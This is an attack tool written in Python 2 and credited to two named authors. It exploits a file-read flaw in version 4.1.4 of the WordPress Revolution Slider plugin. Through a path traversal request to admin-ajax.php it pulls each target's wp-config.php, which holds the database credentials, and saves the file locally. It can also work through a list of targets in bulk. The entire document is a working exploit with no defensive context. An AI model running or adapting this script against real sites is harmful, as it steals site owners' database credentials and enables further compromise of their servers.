# -*- coding: utf-8 -*-


######################################################################################################
# Title: Revolution Slider Exploiter                                                                 #  
# Author: Nasir Khan & Rony Das                                                                      #
# Vendor Homepage : http://codecanyon.net/item/slider-revolution-responsive-wordpress-plugin/2751380 #
# Software Link : Premium plugin                                                                     #      
# Version: 4.1.4                                                                                     #
######################################################################################################

import requests
import time
import sys,os
import optparse
from subprocess import *
from urlparse import urlsplit as us

print """ 

    ____                 ___     __             ______           __      _ __ 
   / __ \___ _   _______/ (_)___/ /__  _____   / ____/  ______  / /___  (_) /_
  / /_/ / _ \ | / / ___/ / / __  / _ \/ ___/  / __/ | |/_/ __ \/ / __ \/ / __/
 / _, _/  __/ |/ (__  ) / / /_/ /  __/ /     / /____>  </ /_/ / / /_/ / / /_  
/_/ |_|\___/|___/____/_/_/\__,_/\___/_/     /_____/_/|_/ .___/_/\____/_/\__/  
                                                      /_/                     
			       Nasir Khan & Rony Das


"""




z = """ 
			
			      Connecting to the Server !!
                
                [+]█████████████████████████████████████████████████[+]


"""




def RevSlider_exploit(url, filename):
	for c in z:
		sys.stdout.write(c)
		sys.stdout.flush()
		time.sleep(0.02)	
        if url and filename: 
		tgt = url + "/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php"
		r = requests.get(tgt) 
              
        if r.status_code == 200:  
            with open(filename, "w") as f:
                f.write(r.content)
            f.close()
            print "Database configuration has been captured and saved to %s\n" % filename
        else: # else any other HTTP reponse means site is not vulnerable!
            print "[-] -- Target is not vulnerable to RevSlider exploit\n"
	

def Main():
    parser = optparse.OptionParser("Usage: %prog --url [TARGET] -f [filename]")
    parser.add_option("-u", "--url", dest="url", type="string", help='Specify your target (e.g :- "http://www.abc.com/")')
    parser.add_option("-f", "--file", dest="filename", type="string", help='Specify your filename (e.g :- --file hello.txt) ')
    parser.add_option("-l", "--list", dest="tgts", type="string", help='Specify your filename (e.g :- --file hello.txt) ')
    (option, args) = parser.parse_args()
    if not option.url and not option.filename and not  option.tgts:
        print parser.usage
    elif not option.url and not option.filename and option.tgts:

        f_in = open(option.tgts) 
        ListOftgts = list(line for line in (l.strip() for l in f_in) if line) 
        print "[*] -- Total Targets to test for 'RevSlider Exploit' : %d " % len(ListOftgts)
        count = 1 # counter
        for tgt in ListOftgts: 
            if "http://" in tgt: 
                url = "%s" % tgt
            elif "https://" in tgt:
                url = "%s" % tgt
            else: 
                url = "http://%s" % tgt
            
            splitedUrl = us(url) 
            f = splitedUrl.netloc 
            filename = f.replace(".", "-") + ".txt"
            print "[%d] Target : (%s)" % (count, url) 
            count += 1 
            RevSlider_exploit(url, filename) 
        print "\n\n[*] -- Task completed.\n"
        

    else:
        url = option.url 
        filename = option.filename
        RevSlider_exploit(url, filename) 

if __name__ == "__main__":
	try:
		Main()
	except KeyboardInterrupt:
		print "[-] User Interrupted.."
